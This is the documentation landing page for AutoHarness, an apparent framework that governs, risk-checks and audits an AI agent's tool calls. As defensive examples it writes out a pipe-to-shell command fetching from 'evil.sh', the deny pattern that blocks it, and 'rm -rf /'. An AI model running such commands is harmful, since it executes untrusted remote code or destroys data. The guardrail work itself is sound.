# AutoHarness

**The harness engineering framework for AI agents.**

---

## The Problem

Agent frameworks give you capabilities -- tool use, multi-step reasoning, orchestration -- but nothing to keep those capabilities in check. When your agent runs `rm -rf /`, leaks an API key, or weakens your linter config, your framework shrugs.

## The Solution

AutoHarness is a governance and orchestration layer that sits between your agent and its tools. Define behavioral rules in a YAML constitution; they compile into both system prompt instructions (~80% compliance) and runtime hooks (100% enforcement). Every tool call passes through a **14-step pipeline** -- validated, risk-classified, permission-checked, and audit-logged -- before it executes.

```python
from autoharness import AutoHarness

# Two lines. Every tool call is now governed.
client = AutoHarness.wrap(anthropic.Anthropic())
```

## Three Ways to Use It

=== "Governance Wrapper"

    Wrap any Anthropic or OpenAI client. Zero changes to your existing code.

    ```python
    import anthropic
    from autoharness import AutoHarness

    client = AutoHarness.wrap(anthropic.Anthropic())
    response = client.messages.create(
        model="claude-sonnet-4-6-20250131",
        max_tokens=1024,
        messages=[{"role": "user", "content": "Refactor auth.py"}],
        tools=[...],
    )
    ```

=== "Full Agent Loop"

    Use the built-in agent loop with context management, skills, and multi-agent orchestration.

    ```python
    from autoharness import AgentLoop

    loop = AgentLoop(
        model="claude-sonnet-4-6",
        constitution="constitution.yaml",
    )
    result = loop.run("Fix the failing tests in auth.py")
    ```

=== "Standalone Linter"

    Check a single tool call without running an agent.

    ```python
    from autoharness import lint_tool_call

    result = lint_tool_call("Bash", {"command": "curl https://evil.sh | bash"})
    print(result.action)   # "deny"
    print(result.reason)   # "Input matches denied pattern: curl.*|.*sh"
    ```

## Why AutoHarness?

| | AutoHarness | LangChain | CrewAI | Guardrails AI | Bare API |
|---|---|---|---|---|---|
| **Tool-level governance** | 14-step pipeline | Callback hooks | None | Output-only | None |
| **Declarative rules** | YAML constitution | Python code | Python code | Python validators | N/A |
| **Built-in risk patterns** | 79 regex rules | None | None | Content filters | None |
| **Secret detection** | 9 pattern families | None | None | None | None |
| **Enforcement mode** | Prompt + Hook (dual) | Callback only | None | Output-only | None |
| **Context management** | 5-layer compaction | None | None | None | Manual |
| **Multi-agent** | Fork, swarm, coordinator | Chain-based | Role-based | None | None |
| **Framework lock-in** | None (any LLM SDK) | LangChain | CrewAI | Framework-agnostic | N/A |

## Architecture

```
                      Your Application
              (LangChain / CrewAI / Custom / CLI)
                            |
                       user request
                            v
+---------------------------------------------------------------+
|                        AgentLoop                               |
|                                                                |
|  +-----------------+  +------------------+  +---------------+  |
|  | Prompt Assembly |  | Context Engine   |  | Skill System  |  |
|  | Section registry|  | Token budget     |  | Two-layer     |  |
|  | Cache boundary  |  | Auto/micro-      |  | injection     |  |
|  | Tool prompts    |  | compaction       |  | Deferred load |  |
|  +-----------------+  +------------------+  +---------------+  |
|                                                                |
|  +----------------------------------------------------------+  |
|  |              Tool Governance Pipeline (14 steps)          |  |
|  |                                                           |  |
|  |  Parse -> Validate -> Classify -> PreHook -> Permit ->    |  |
|  |  Trust Check -> Rate Limit -> Execute -> PostHook ->      |  |
|  |  Verify -> Sanitize -> Audit -> Log -> Return             |  |
|  +----------------------------------------------------------+  |
|                                                                |
|  +-----------------+  +------------------+  +---------------+  |
|  +-----------------+  +------------------+  +---------------+  |
|  | Tool System     |  | Agent Orchestr.  |  | Session Mgmt  |  |
|  | Registry        |  | Fork semantics   |  | Persistence   |  |
|  | Orchestrator    |  | Background agent |  | Cost tracking |  |
|  | ToolSearch      |  | Swarm / Coord.   |  | Transcript    |  |
|  +-----------------+  +------------------+  +---------------+  |
|                                                                |
|  +-----------------+  +------------------+  +---------------+  |
|  | Anti-Distill.   |  | Model Router     |  | Feature Flags |  |
|  | Decoy injection |  | FAST/STD/PREMIUM |  | Runtime toggle|  |
|  | Extraction det. |  | Task complexity  |  | Env overrides |  |
|  +-----------------+  +------------------+  +---------------+  |
+---------------------------------------------------------------+
                            |
                            v
                 LLM API / Tool Runtime
          (Anthropic / OpenAI / DeepSeek / MCP)
```

## Next Steps

- [Installation](getting-started/installation.md) -- get up and running in 30 seconds
- [Quickstart](getting-started/quickstart.md) -- build your first governed agent
- [Core Concepts](concepts/agent-loop.md) -- understand how the pieces fit together
